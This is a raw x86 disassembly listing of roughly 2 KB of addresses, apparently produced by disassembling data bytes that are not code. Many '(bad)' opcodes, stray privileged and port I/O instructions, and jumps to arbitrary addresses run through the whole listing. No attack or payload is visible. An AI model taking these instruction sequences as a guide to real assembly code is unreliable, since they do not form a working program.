  4213ff:	cdq    
  421400:	test   BYTE PTR [esi+edx*1+0x27],dl
  421404:	out    dx,al
  421405:	mov    bh,0xf4
  421407:	jno    0x421448
  421409:	pop    ecx
  42140a:	mov    BYTE PTR [esi+edi*1],0x46
  42140e:	xchg   esp,eax
  42140f:	jp     0x42147f
  421411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421412:	(bad)  
  421413:	repz test al,0xc1
  421416:	sti    
  421417:	mov    bl,0xa8
  421419:	popa   
  42141a:	or     dl,ch
  42141c:	jmp    0x421476
  42141e:	bound  ebp,QWORD PTR [eax-0x6e]
  421421:	test   DWORD PTR [ecx-0x32],esp
  421424:	call   0x8135aa0b
  421429:	fnstcw WORD PTR [ecx]
  42142b:	mov    ds,WORD PTR [ebx]
  42142d:	(bad)  
  42142e:	mov    ecx,0xeb2f2f67
  421433:	int    0x3b
  421435:	xchg   ecx,eax
  421436:	cmp    eax,0x8593544
  42143b:	xchg   esp,eax
  42143c:	bound  edi,QWORD PTR [edx+0x4f16a2d3]
  421442:	fistp  WORD PTR [edx-0x13]
  421445:	aam    0xee
  421447:	pop    ss
  421448:	ret    
  421449:	ja     0x42143c
  42144b:	sbb    DWORD PTR [eax+0x5d],esi
  42144e:	push   es
  42144f:	sub    eax,0xf3d858b0
  421454:	mov    ecx,0x2566224d
  421459:	mov    eax,ds:0xbe69f480
  42145e:	lea    edi,[ecx]
  421460:	jb     0x4214c3
  421462:	dec    edx
  421463:	and    eax,0xeffc68f4
  421468:	imul   esi,DWORD PTR [esi-0x2dd6f35b],0x5f
  42146f:	sbb    eax,0xaba27a2c
  421474:	cmp    eax,DWORD PTR [esi]
  421476:	jnp    0x4214cb
  421478:	inc    ecx
  421479:	pushf  
  42147a:	inc    esp
  42147b:	dec    ecx
  42147c:	shl    BYTE PTR es:[ebp-0x74b931ff],cl
  421483:	pop    edi
  421484:	imul   esp,DWORD PTR [ebx],0xffffffef
  421487:	or     cl,BYTE PTR [esi+0x4565a959]
  42148d:	out    dx,al
  42148e:	icebp  
  42148f:	mov    edx,?
  421491:	in     al,0xa5
  421493:	pop    ss
  421494:	cmp    edi,DWORD PTR [edx+0x5653]
	...
  421512:	add    BYTE PTR [eax],al
  421514:	pushf  
  421515:	sbb    al,bl
  421517:	push   esi
  421518:	(bad)  
  42151a:	sahf   
  42151b:	fidivr DWORD PTR [esi-0x64]
  42151e:	add    al,ah
  421520:	cmp    DWORD PTR [eax-0x53423219],ecx
  421526:	add    DWORD PTR [eax],eax
  421528:	ins    BYTE PTR es:[edi],dx
  421529:	pop    es
  42152a:	add    BYTE PTR [eax],al
  42152c:	mov    eax,ds:0xa932f872
  421531:	pop    eax
  421532:	inc    edx
  421533:	sub    eax,0x228fd48e
  421538:	adc    BYTE PTR [ebp+edi*8-0x76],ch
  42153c:	loop   0x4214d5
  42153e:	cmp    esp,DWORD PTR [eax+eax*2+0x20]
  421542:	cmp    eax,0x25be5061
  421547:	popf   
  421548:	pop    ebx
  421549:	rcr    BYTE PTR [edi+ebp*8],0xef
  42154d:	icebp  
  42154e:	adc    BYTE PTR [edi],0xa2
  421551:	mov    ah,0x10
  421553:	mov    cl,0x45
  421555:	sub    BYTE PTR [ecx],bh
  421557:	pop    esp
  421558:	xchg   ecx,eax
  421559:	sub    eax,0x4e385435
  42155e:	in     al,dx
  42155f:	in     al,dx
  421560:	pop    edx
  421561:	shl    BYTE PTR [esi],cl
  421563:	stos   DWORD PTR es:[edi],eax
  421564:	or     cl,dh
  421566:	sbb    bh,BYTE PTR [esi+0x3fedd038]
  42156c:	stos   DWORD PTR es:[edi],eax
  42156d:	add    esp,DWORD PTR [ebx]
  42156f:	repnz neg dl
  421572:	mov    cl,0xd8
  421574:	mov    cl,0xb6
  421576:	hlt    
  421577:	jp     0x4215f4
  421579:	imul   eax,DWORD PTR [esi-0x88cd871],0x96ca43d1
  421583:	pop    esp
  421584:	lea    ebp,[ecx+0x3d306a78]
  42158a:	(bad)  [ebp+0x5a]
  42158d:	push   eax
  42158e:	sbb    BYTE PTR [edx],bh
  421590:	push   edx
  421591:	inc    esi
  421592:	or     dl,0x4e
  421595:	mov    ds:0xb25495b7,eax
  42159a:	repz ret 0xa47f
  42159e:	add    edx,eax
  4215a0:	stos   BYTE PTR es:[edi],al
  4215a1:	inc    ecx
  4215a2:	sbb    DWORD PTR [ebx-0x6f],ebx
  4215a5:	and    ebp,DWORD PTR [eax+0x6bdc529b]
  4215ab:	pop    esp
  4215ac:	sbb    esi,DWORD PTR [ecx-0x4c]
  4215af:	leave  
  4215b0:	ret    0xbc20
  4215b3:	loopne 0x421557
  4215b5:	jo     0x421586
  4215b7:	and    al,dh
  4215b9:	push   eax
  4215ba:	sub    dl,al
  4215bc:	jbe    0x4215dd
  4215be:	mov    esp,0xa02e1134
  4215c3:	mov    dl,0x8a
  4215c5:	push   es
  4215c6:	leave  
  4215c7:	nop
  4215c8:	and    eax,0xd222fb68
  4215cd:	adc    DWORD PTR [ecx-0x1b751236],eax
  4215d3:	sub    eax,0x6ca85394
  4215d8:	dec    ebx
  4215d9:	das    
  4215da:	int    0x57
  4215dc:	lock sbb DWORD PTR [ecx-0xb30c8f1],0x40
  4215e4:	pop    ds
  4215e5:	xchg   esp,eax
  4215e6:	cmc    
  4215e7:	sub    BYTE PTR [edi],dl
  4215e9:	vmwrite ecx,ebx
  4215ec:	div    bl
  4215ee:	mov    eax,DWORD PTR [edx-0x5df81258]
  4215f4:	sbb    bh,0x7a
  4215f7:	lds    eax,FWORD PTR [ecx-0x47d50116]
  4215fd:	and    BYTE PTR es:[esi-0x37],bh
  421601:	jo     0x4215c4
  421603:	imul   ebx,DWORD PTR [ecx-0x1c0a94c6],0xdbf2258
  42160d:	mov    ds:0x3f5fe530,al
  421612:	and    DWORD PTR [ebp+0x281955a4],eax
  421618:	push   0xbe1d7bde
  42161d:	dec    ebx
  42161e:	mov    al,0xb1
  421620:	aaa    
  421621:	sub    BYTE PTR [ecx],ah
  421623:	enter  0xaeea,0x9c
  421627:	sbb    dh,cl
  421629:	repnz sti 
  42162b:	cdq    
  42162c:	sub    BYTE PTR [ebx],0xcf
  42162f:	leave  
  421630:	sti    
  421631:	test   eax,0x728f98a4
  421636:	xor    BYTE PTR [edi-0xb67b2ea],bl
  42163c:	xlat   BYTE PTR ds:[ebx]
  42163d:	imul   eax,DWORD PTR [ebx+ebp*4+0x3501025f],0xc009ee76
  421648:	(bad)  
  421649:	rol    al,1
  42164b:	and    ebp,ecx
  42164d:	out    0x32,eax
  42164f:	mov    cl,0x1f
  421651:	mov    ecx,0x7253c67d
  421656:	in     eax,dx
  421657:	sbb    al,0xd7
  421659:	dec    esp
  42165a:	xor    ah,ch
  42165c:	add    eax,0xf8f78bd5
  421661:	inc    ebx
  421662:	fnsave ds:0x105d8c46
  421668:	or     DWORD PTR [ecx],ebp
  42166a:	aaa    
  42166b:	mov    ebx,0x512721cc
  421670:	cwde   
  421671:	xchg   edi,esp
  421673:	push   ecx
  421674:	leave  
  421675:	sub    dl,BYTE PTR [ecx+0x34a78302]
  42167b:	popf   
  42167c:	add    al,0x0
  42167e:	frstor [eax]
  421680:	(bad)  
  421681:	cmp    eax,0x7e29e1f2
  421686:	(bad)  
  421687:	scas   al,BYTE PTR es:[edi]
  421688:	mov    esp,0xecdf64e3
  42168d:	push   cs
  42168e:	jle    0x4216b7
  421690:	cs mov edi,0x566a0ba0
  421696:	in     eax,dx
  421697:	ss retf 0xccde
  42169b:	fidiv  WORD PTR [edi]
  42169d:	stos   DWORD PTR es:[edi],eax
  42169e:	xchg   ecx,eax
  42169f:	out    0xca,al
  4216a1:	icebp  
  4216a2:	and    BYTE PTR [esi-0x5f],bh
  4216a5:	(bad)  
  4216a6:	push   ss
  4216a7:	(bad)  
  4216a8:	cmp    ebp,DWORD PTR es:[eax]
  4216ab:	lea    ebx,[edx-0x58]
  4216ae:	inc    eax
  4216af:	(bad)  
  4216b0:	push   es
  4216b1:	mov    ds:0x659a2289,eax
  4216b6:	mov    ds,WORD PTR [esi+0x305433fa]
  4216bc:	aas    
  4216bd:	fmul   QWORD PTR [eax+0x34]
  4216c0:	xchg   edx,eax
  4216c1:	repnz inc esp
  4216c3:	ins    DWORD PTR es:[edi],dx
  4216c4:	inc    ebp
  4216c5:	jl     0x421668
  4216c7:	and    BYTE PTR [edx+0x54eb7b36],0x5
  4216ce:	stos   BYTE PTR es:[edi],al
  4216cf:	dec    ecx
  4216d0:	jns    0x42170a
  4216d2:	or     al,0x85
  4216d4:	ss in  al,dx
  4216d6:	nop    eax
  4216d9:	xchg   ecx,eax
  4216da:	retf   0xc545
  4216dd:	in     eax,dx
  4216de:	jl     0x421739
  4216e0:	mul    DWORD PTR [esi-0x4f]
  4216e3:	hlt    
  4216e4:	lahf   
  4216e5:	sub    al,BYTE PTR [ebp-0x14f6e7cf]
  4216eb:	imul   esp,DWORD PTR [edx],0x2b
  4216ee:	call   0x358b:0x3004e218
  4216f5:	xor    ah,BYTE PTR [edx+0x2589c68c]
  4216fb:	pop    esi
  4216fc:	push   edi
  4216fd:	adc    ch,BYTE PTR [ebp+0x5a]
  421700:	push   es
  421701:	fild   QWORD PTR [edi-0xf]
  421704:	outs   dx,BYTE PTR ds:[esi]
  421705:	(bad)  
  421706:	sahf   
  421707:	pop    ss
  421708:	sahf   
  421709:	push   cs
  42170a:	xchg   DWORD PTR [eax-0x725df4c0],ebp
  421710:	or     al,0xf5
  421712:	mov    ebp,0x9e4b1e2c
  421717:	or     eax,ebp
  421719:	xchg   DWORD PTR [esi+ecx*1],esi
  42171c:	(bad)  
  42171d:	xchg   edx,eax
  42171e:	jae    0x4216e3
  421720:	gs push eax
  421722:	mov    esp,0xb9ed44ba
  421727:	jp     0x42177e
  421729:	adc    eax,0x6d678989
  42172e:	adc    BYTE PTR [edx+0x52d4e528],bh
  421734:	shl    dh,0x47
  421737:	and    ah,BYTE PTR [esi-0x2518ddb]
  42173d:	add    BYTE PTR [edx-0x56],0x52
  421741:	in     al,0x88
  421743:	add    eax,0x637f48ba
  421748:	or     eax,0xb2ac963f
  42174d:	cdq    
  42174e:	adc    esp,edx
  421750:	add    DWORD PTR [esi-0x4b],ecx
  421753:	add    edx,DWORD PTR [bx+si-0x59f4]
  421758:	push   0xe93cb718
  42175d:	xchg   esp,eax
  42175e:	test   eax,0x77fba029
  421763:	mov    ah,BYTE PTR [ebp+0x25]
  421766:	mov    ds:0xc0d95221,al
  42176b:	in     al,dx
  42176c:	add    ah,BYTE PTR [ebx-0x1e]
  42176f:	es inc edx
  421771:	mov    al,0x7c
  421773:	or     ch,ch
  421775:	mov    eax,0xacfc5a85
  42177a:	cmp    edi,ebp
  42177c:	jne    0x421799
  42177e:	pop    edx
  42177f:	retf   
  421780:	xchg   esi,eax
  421781:	or     DWORD PTR [eax+0x39a56a02],ecx
  421787:	sahf   
  421788:	mov    ebp,0x7bb5fd4f
  42178d:	jl     0x42171a
  42178f:	outs   dx,BYTE PTR ds:[esi]
  421790:	add    BYTE PTR [ecx],bl
  421792:	nop
  421793:	adc    DWORD PTR [edi-0x66],edi
  421796:	cdq    
  421797:	jns    0x4217a8
  421799:	cld    
  42179a:	push   esp
  42179b:	lds    edx,FWORD PTR [edi]
  42179d:	sbb    bh,dh
  42179f:	add    BYTE PTR [esi+0x7d],cl
  4217a2:	dec    esi
  4217a3:	jge    0x42179d
  4217a5:	and    ch,BYTE PTR [edi]
  4217a7:	mov    ds:0x23516866,al
  4217ac:	jmp    0xd10c5c58
  4217b1:	inc    edx
  4217b2:	sub    esi,DWORD PTR [ebx]
  4217b4:	xor    edi,DWORD PTR [esi-0x3a45babd]
  4217ba:	dec    esi
  4217bb:	xchg   esi,ebp
  4217bd:	pop    es
  4217be:	ins    DWORD PTR es:[edi],dx
  4217bf:	mov    BYTE PTR [edi+0x5e907ea2],ch
  4217c5:	inc    edx
  4217c6:	mov    ah,0xe8
  4217c8:	add    eax,0x5a60201b
  4217cd:	popf   
  4217ce:	das    
  4217cf:	loope  0x4217ad
  4217d1:	imul   edx,DWORD PTR [ebx],0x1e4ab7d3
  4217d7:	mov    edi,0x795d4713
  4217dc:	gs in  al,0xd
  4217df:	inc    eax
  4217e0:	cli    
  4217e1:	cmp    cl,BYTE PTR [edx-0x656332b4]
  4217e7:	clc    
  4217e8:	dec    eax
  4217e9:	sbb    edi,eax
  4217eb:	or     ebp,DWORD PTR [ebx-0x720036b5]
  4217f1:	mov    ?,WORD PTR [eax]
  4217f3:	xchg   DWORD PTR [ebx-0x63baab91],esp
  4217f9:	loopne 0x421867
  4217fb:	inc    edi
  4217fc:	shl    DWORD PTR [esi+0x34fe4e95],cl
  421802:	inc    edx
  421803:	std    
  421804:	mov    dl,0x2b
  421806:	shl    DWORD PTR [ebp-0x3fbfe4c7],1
  42180c:	jg     0x42184d
  42180e:	pop    edx
  42180f:	test   al,0xaa
  421811:	push   0xffffff83
  421813:	push   ds
  421814:	bound  esi,QWORD PTR [edx+ecx*2-0x7b]
  421818:	push   DWORD PTR [esi-0x56]
  42181b:	call   0xad842a2b
  421820:	jge    0x4217a7
  421822:	shl    BYTE PTR [ebx+edx*1],cl
  421825:	shl    esp,1
  421827:	mov    DWORD PTR [ecx-0x29],ecx
  42182a:	sbb    edx,edx
  42182c:	hlt    
  42182d:	out    dx,al
  42182e:	xchg   BYTE PTR [esi+0x5db3f153],cl
  421834:	cwde   
  421835:	iret   
  421836:	and    BYTE PTR ds:0x137a885d,dl
  42183c:	xchg   edx,eax
  42183d:	fwait
  42183e:	ror    DWORD PTR [eax-0xc],1
  421841:	jl     0x4218b4
  421843:	inc    edi
  421844:	adc    edx,DWORD PTR [edx]
  421846:	inc    esi
  421847:	cmp    ch,BYTE PTR [esi+edx*4]
  42184a:	or     ebx,DWORD PTR [esp+edx*8-0x2e]
  42184e:	xchg   edi,eax
  42184f:	std    
  421850:	add    cl,ch
  421852:	stc    
  421853:	js     0x4218a8
  421855:	xchg   ebp,eax
  421856:	mov    ecx,0xc0b83131
  42185b:	mov    al,0x32
  42185d:	fld    TBYTE PTR [edi-0x39c87615]
  421863:	(bad)  
  421864:	xor    al,0xd5
  421866:	sub    ah,dl
  421868:	loope  0x421839
  42186a:	xchg   ebx,eax
  42186b:	ss dec ebp
  42186d:	jge    0x421860
  42186f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421870:	xchg   ebp,eax
  421871:	mov    dl,BYTE PTR [ecx+0x5a7b8e10]
  421877:	add    eax,0xfc6d7567
  42187c:	lods   eax,DWORD PTR ds:[esi]
  42187d:	mov    ch,0x3
  42187f:	adc    BYTE PTR [ebp+ebx*1-0x68],cl
  421883:	lock ret 0x4656
  421887:	jns    0x4218dd
  421889:	sbb    eax,0x4138299b
  42188e:	mov    ss,WORD PTR [si+0x600b]
  421893:	xchg   DWORD PTR [ecx-0x6c6ac11d],esi
  421899:	adc    DWORD PTR [ebx+0x2e],edi
  42189c:	pop    ebx
  42189d:	fs and eax,0x6fa3a38
  4218a3:	mov    cl,0x71
  4218a5:	test   BYTE PTR [edx],ch
  4218a7:	lahf   
  4218a8:	mov    ebp,0xc5a46897
  4218ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ae:	sub    dl,BYTE PTR [eax+0x1d3aae94]
  4218b4:	sbb    ebp,edx
  4218b6:	mov    DWORD PTR [ecx+0x41],edx
  4218b9:	sub    al,0xba
  4218bb:	cmc    
  4218bc:	arpl   WORD PTR [ebx],di
  4218be:	xor    ebp,DWORD PTR [edi]
  4218c0:	push   cs
  4218c1:	push   ebp
  4218c2:	dec    ecx
  4218c3:	push   ecx
  4218c4:	test   bl,bh
  4218c6:	add    ch,BYTE PTR [esi-0x62]
  4218c9:	pop    esi
  4218ca:	sbb    al,0x60
  4218cc:	xor    dh,ch
  4218ce:	sub    BYTE PTR [edx],bh
  4218d0:	adc    BYTE PTR [ebp-0x3b],ah
  4218d3:	gs into 
  4218d5:	ins    DWORD PTR es:[edi],dx
  4218d6:	or     BYTE PTR [esp+ecx*1+0x58],0xc
  4218db:	retf   
  4218dc:	aam    0xcc
  4218de:	or     BYTE PTR [edx-0x3b65a055],dh
  4218e4:	test   al,0xd4
  4218e6:	ja     0x4218aa
  4218e8:	fld    DWORD PTR [edi-0x68]
  4218eb:	pop    eax
  4218ec:	frndint 
  4218ee:	dec    ecx
  4218ef:	cmp    eax,0xc2f2868f
  4218f4:	sbb    edx,DWORD PTR [esp+ebp*4]
  4218f7:	adc    cl,BYTE PTR [ecx-0x346db0f0]
  4218fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218fe:	fisubr DWORD PTR [ebp+0x32]
  421901:	sbb    DWORD PTR [esp+ebx*1+0x3bb5ee33],ebp
  421908:	clc    
  421909:	neg    BYTE PTR [eax-0x34]
  42190c:	pop    es
  42190d:	fwait
  42190e:	inc    DWORD PTR ds:0xa18755c4
  421914:	cld    
  421915:	jae    0x4218a1
  421917:	test   al,0xd5
  421919:	loop   0x4218e0
  42191b:	xor    eax,0x79c6a567
  421920:	inc    esi
  421921:	push   ds
  421922:	lahf   
  421923:	rol    BYTE PTR [ebp+0x41ef6c2e],0xb4
  42192a:	lods   al,BYTE PTR ds:[esi]
  42192b:	push   esi
  42192c:	mov    WORD PTR [edi],gs
  42192e:	xor    al,0x2c
  421930:	stc    
  421931:	and    eax,0xa923d18f
  421936:	stc    
  421937:	cmp    dh,BYTE PTR [esi]
  421939:	clc    
  42193a:	add    DWORD PTR [ebx],ebx
  42193c:	sbb    al,0xa0
  42193e:	test   al,0x53
  421940:	cmp    BYTE PTR [edi-0x6d80a549],0xa5
  421947:	push   cs
  421948:	(bad)  
  421949:	sahf   
  42194a:	inc    esp
  42194b:	mov    ecx,0xddeb5a1a
  421950:	mov    ch,0xae
  421952:	in     eax,0x86
  421954:	jl     0x421979
  421956:	fidivr DWORD PTR [ebp-0x4336ea]
  42195c:	mov    ecx,0x2edfcc61
  421961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421962:	(bad)  
  421963:	pushf  
  421964:	jp     0x42197d
  421966:	imul   eax,DWORD PTR [ebp+edi*1+0x48],0x225b59aa
  42196e:	jmp    0x3202550
  421973:	popf   
  421974:	sbb    al,0xdc
  421976:	sbb    dl,BYTE PTR [esi+ecx*4+0x5d7255c9]
  42197d:	sub    al,0xeb
  42197f:	sbb    BYTE PTR [esi-0x44c62d46],ch
  421985:	mov    ch,0xe0
  421987:	mov    ebp,0x21f843fa
  42198c:	mov    dh,0x1e
  42198e:	retf   
  42198f:	mov    ds:0x75397d22,al
  421994:	sti    
  421995:	retf   0x905a
  421998:	xchg   ecx,eax
  421999:	lods   eax,DWORD PTR ds:[esi]
  42199a:	inc    eax
  42199b:	sbb    eax,0x21a18252
  4219a0:	xor    BYTE PTR [edi+0x1cb5e5cc],cl
  4219a6:	inc    esi
  4219a7:	sub    al,0xa6
  4219aa:	lahf   
  4219ab:	mov    eax,ds:0xe465a0e8
  4219b0:	adc    ch,BYTE PTR [edi-0x7c]
  4219b3:	xor    BYTE PTR ds:0xd8045b22,bl
  4219b9:	imul   eax,DWORD PTR [eax-0x41c04f07],0x7e9e6397
  4219c3:	daa    
  4219c4:	push   esi
  4219c5:	dec    ebp
  4219c6:	jg     0x4219ec
  4219c8:	cdq    
  4219c9:	jae    0x42198d
  4219cb:	xor    ch,BYTE PTR [ecx-0x31]
  4219ce:	xor    DWORD PTR [eax],edi
  4219d0:	sbb    esi,DWORD PTR [edi]
  4219d2:	pop    ds
  4219d3:	adc    eax,0x851b65af
  4219d8:	sbb    al,0xa7
  4219da:	sbb    eax,0x1a216ea1
  4219df:	test   al,0xae
  4219e1:	loopne 0x421a5b
  4219e3:	cld    
  4219e4:	mov    DWORD PTR [edi+ebp*1-0xa579a92],eax
  4219eb:	in     al,dx
  4219ec:	iret   
  4219ed:	adc    eax,0x99989b48
  4219f2:	repnz or DWORD PTR [esi],edi
  4219f5:	pushf  
  4219f6:	cmp    BYTE PTR [ecx],bl
  4219f8:	and    ebp,DWORD PTR [edi+0x70]
  4219fb:	jmp    0xe5b8d1ff
  421a00:	push   ecx
  421a01:	lea    esi,[ecx+ebx*2]
  421a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a05:	inc    DWORD PTR [edx-0x770d81e7]
  421a0b:	adc    edi,0xfffffffb
  421a0e:	leave  
  421a0f:	mov    edi,0x38414315
  421a14:	nop
  421a15:	cmp    DWORD PTR [ebx+eax*2+0x5320d76],edi
  421a1c:	mov    ch,0xca
  421a1e:	out    dx,eax
  421a1f:	xor    edx,DWORD PTR [ecx+ebp*4-0x7c]
  421a23:	retf   0xb11d
  421a26:	push   ds
  421a27:	adc    edx,esp
  421a29:	scas   al,BYTE PTR es:[edi]
  421a2a:	mov    BYTE PTR [edi+0x5d],bl
  421a2d:	(bad)  
  421a2e:	jp     0x421a35
  421a30:	les    esp,FWORD PTR [ebp+0x5f]
  421a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a34:	xchg   ecx,eax
  421a35:	sbb    DWORD PTR [edi+0x6d],esp
  421a38:	xchg   edi,eax
  421a39:	aam    0x16
  421a3b:	inc    eax
  421a3c:	dec    ebp
  421a3d:	popf   
  421a3e:	xor    edx,DWORD PTR [edi-0x29]
  421a41:	adc    esp,ebx
  421a43:	jbe    0x421aab
  421a45:	or     edx,esp
  421a47:	or     eax,0x9775fbeb
  421a4c:	sbb    esp,ebx
  421a4e:	xor    ah,BYTE PTR [ebx+0x3e]
  421a51:	scas   eax,DWORD PTR es:[edi]
  421a52:	cmp    ah,bh
  421a54:	inc    eax
  421a55:	xchg   edx,eax
  421a56:	xchg   edx,eax
  421a57:	dec    edi
  421a58:	mov    eax,0x1c5830e3
  421a5d:	ins    DWORD PTR es:[edi],dx
  421a5e:	lock cmc 
  421a60:	ror    DWORD PTR [ebp+0x7e],0xcd
  421a64:	push   esi
  421a65:	xchg   ecx,eax
  421a66:	mov    eax,0x862ecaf9
  421a6b:	pop    ds
  421a6c:	dec    edi
  421a6d:	fs nop
  421a6f:	daa    
  421a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a71:	and    ch,BYTE PTR [esi+0x53]
  421a74:	popa   
  421a75:	cld    
  421a76:	mov    eax,ds:0xa2e2e961
  421a7b:	jle    0x421abe
  421a7d:	ret    0x401c
  421a80:	(bad)  
  421a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a82:	cmp    ecx,ebp
  421a84:	out    0x66,al
  421a86:	and    al,0x6b
  421a88:	xor    bh,bh
  421a8a:	enter  0xb51d,0x89
  421a8e:	mov    ebx,0x3d62d1ce
  421a93:	push   ds
  421a94:	or     bh,BYTE PTR [ebx+eax*4-0x5f]
  421a98:	mov    al,0xc0
  421a9a:	push   ecx
  421a9b:	xlat   BYTE PTR ds:[ebx]
  421a9c:	sub    DWORD PTR [ebx-0x53],ebp
  421a9f:	xchg   DWORD PTR [edx+0x55098d57],ecx
  421aa5:	fwait
  421aa6:	mov    dh,0x5f
  421aa8:	cs inc ecx
  421aaa:	add    ebx,DWORD PTR [esi-0x75]
  421aad:	rcr    BYTE PTR [edx],1
  421aaf:	in     eax,dx
  421ab0:	gs sahf 
  421ab2:	pop    ss
  421ab3:	fnstsw WORD PTR [edx-0x7baf406]
  421ab9:	sti    
  421aba:	push   edx
  421abb:	jmp    0x421adb
  421abd:	push   eax
  421abe:	popa   
  421abf:	les    ebp,FWORD PTR [edx+0x55]
  421ac2:	mov    DWORD PTR [ebp-0x80],ebp
  421ac5:	xchg   ecx,eax
  421ac6:	or     al,0x86
  421ac8:	adc    DWORD PTR [edi+0xb],edi
  421acb:	sub    BYTE PTR [esi+edi*1],al
  421ace:	shl    BYTE PTR [edi+0x6092935c],0x55
  421ad5:	push   0xdf6e1e9f
  421ada:	cmp    ebx,esp
  421adc:	sub    edx,DWORD PTR [edi-0x186c1e63]
  421ae2:	enter  0xe5df,0x52
  421ae6:	mov    ebx,0x8f718e0c
  421aeb:	mov    al,0xd8
  421aed:	aas    
  421aee:	inc    edi
  421aef:	shl    edx,0x64
  421af2:	mov    ecx,0x213b1173
  421af7:	push   eax
  421af8:	scas   al,BYTE PTR es:[edi]
  421af9:	lock jns 0x421aaf
  421afc:	inc    edx
  421afd:	rol    esp,1
  421aff:	and    esp,ecx
  421b01:	push   es
  421b02:	push   ds
  421b03:	push   edi
  421b04:	popa   
  421b05:	in     al,dx
  421b06:	mov    edx,0x8325b43
  421b0b:	aad    0xdd
  421b0d:	cmp    esp,DWORD PTR [edx-0x27]
  421b10:	shl    DWORD PTR [eax],1
  421b12:	test   eax,0x649ef1d0
  421b17:	pop    esp
  421b18:	xor    BYTE PTR [ebp+0x393a16fc],bl
  421b1e:	pusha  
  421b1f:	je     0x421abe
  421b21:	mov    dh,0x11
  421b23:	and    DWORD PTR [eax],eax
  421b25:	jno    0x421b0c
  421b27:	js     0x421b87
  421b29:	and    DWORD PTR [ebp-0x79],0xb3ca3a61
  421b30:	bound  ecx,QWORD PTR [eax]
  421b32:	mov    ch,0x79
  421b34:	(bad)  
  421b35:	mov    edx,0xc45b79f1
  421b3a:	ins    BYTE PTR es:[edi],dx
  421b3b:	mov    ds:0xd2a8bd39,al
  421b40:	fmul   st,st(1)
  421b42:	jne    0x421b5a
  421b44:	sub    dl,BYTE PTR [esi-0x24]
  421b47:	into   
  421b48:	mov    eax,ds:0x3ebda015
  421b4d:	mov    ch,BYTE PTR [ecx]
  421b4f:	pop    ds
  421b50:	das    
  421b51:	jl     0x421ba5
  421b53:	xabort 0xd5
  421b56:	xor    ch,al
  421b58:	sub    edi,DWORD PTR [edx-0x5e6cbfb1]
  421b5e:	or     DWORD PTR [ebx+0x2f363fcb],ebp
  421b64:	jb     0x421b68
  421b66:	jne    0x421b96
  421b68:	cmp    cl,BYTE PTR [eax]
  421b6a:	dec    eax
  421b6b:	std    
  421b6c:	jae    0x421b6b
  421b6e:	pop    ecx
  421b6f:	repz adc al,0xed
  421b72:	cs push edx
  421b74:	pushf  
  421b75:	(bad)  
  421b76:	and    BYTE PTR [edi-0x4d167e77],ch
  421b7c:	xchg   edi,eax
  421b7d:	in     eax,dx
  421b7e:	sti    
  421b7f:	fist   DWORD PTR [ecx-0x48]
  421b82:	add    DWORD PTR [ebp+0x63],ebx
  421b85:	sbb    ecx,DWORD PTR [ecx+0x37]
  421b88:	in     al,dx
  421b89:	(bad)  
  421b8a:	aas    
  421b8b:	and    DWORD PTR ds:0x5fffc5fc,ebp
  421b91:	push   0x23
  421b93:	in     eax,0xe3
  421b95:	sub    esp,DWORD PTR [esi]
  421b97:	xor    cl,ah
  421b99:	add    ah,BYTE PTR [ebp-0x40c3c3a7]
  421b9f:	dec    eax
  421ba0:	in     eax,dx
  421ba1:	retf   
  421ba2:	ret    
  421ba3:	xor    BYTE PTR [ecx],0x8e
  421ba6:	xchg   ebp,eax
  421ba7:	sub    BYTE PTR [ecx+0x5d],0x7
  421bab:	loope  0x421b63
  421bad:	mov    al,ds:0xa77008e9
  421bb2:	int3   
  421bb3:	xor    cl,BYTE PTR [ebx-0x49b5d292]
  421bb9:	sbb    DWORD PTR [eax+0x68e93d3],edx
  421bbf:	mov    ecx,0x9faaf36d
  421bc4:	dec    eax
  421bc5:	imul   ebx,DWORD PTR [ebx+0x7c76e0b3],0xffffffde
  421bcc:	bound  esi,QWORD PTR [eax-0x15]
  421bcf:	push   ebx
  421bd0:	dec    ecx
  421bd1:	jle    0x421be9
  421bd3:	mov    edx,0xd65ac5ea
  421bd8:	ret    
  421bd9:	push   esp
  421bda:	mov    cl,0xf1
  421bdc:	(bad)  
  421bdd:	xchg   BYTE PTR [edx+ebx*1],cl
  421be0:	int    0x47
  421be2:	xor    BYTE PTR [edi-0x50],0x26
  421be6:	fcom   QWORD PTR [ecx+esi*2-0x7c19e8ff]
  421bed:	mov    ebp,0x7e444853
  421bf2:	adc    DWORD PTR [eax+0x5095085],ecx
  421bf8:	fmul   DWORD PTR [ebp-0x73]
  421bfb:	les    ecx,FWORD PTR [esi]
  421bfd:	cwde   
  421bfe:	(bad)  
  421bff:	shl    DWORD PTR [ebp-0x6f41e1b5],cl
  421c05:	shr    BYTE PTR [ebx],1
  421c07:	lods   al,BYTE PTR ds:[esi]
  421c08:	dec    edx
  421c09:	int3   
  421c0a:	test   dh,0x32
  421c0d:	jecxz  0x421bad
  421c0f:	sub    DWORD PTR [edi],esp
  421c11:	es cmp eax,0xc8e7db96
  421c17:	push   esi
  421c18:	dec    esp
  421c19:	xchg   esp,eax
  421c1a:	xlat   BYTE PTR ds:[ebx]
  421c1b:	int3   
  421c1c:	mov    ds:0xf6fa1a4a,al
  421c21:	pop    eax
  421c22:	pop    esi
  421c23:	or     DWORD PTR [edx],esi
  421c25:	shr    DWORD PTR [edi],1
  421c27:	rcl    DWORD PTR [ebx],0x90
  421c2a:	xchg   ecx,eax
  421c2b:	jo     0x421c7e
  421c2d:	inc    edi
  421c2e:	dec    ecx
  421c2f:	sub    cl,BYTE PTR [ecx+0x40]
  421c32:	xchg   BYTE PTR [ebx-0x68],cl
  421c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c36:	cmp    BYTE PTR [edi+ecx*2-0x47],ch
  421c3a:	scas   eax,DWORD PTR es:[edi]
  421c3b:	jmp    0x1950b523
  421c40:	xor    esi,esp
  421c42:	pop    ebp
  421c43:	mov    al,ds:0xffee0930
  421c48:	repnz pop esp
  421c4a:	mov    ah,0x69
  421c4c:	jmp    0x91b7b174
  421c51:	mov    eax,DWORD PTR ds:0x40ff8064
  421c57:	sti    
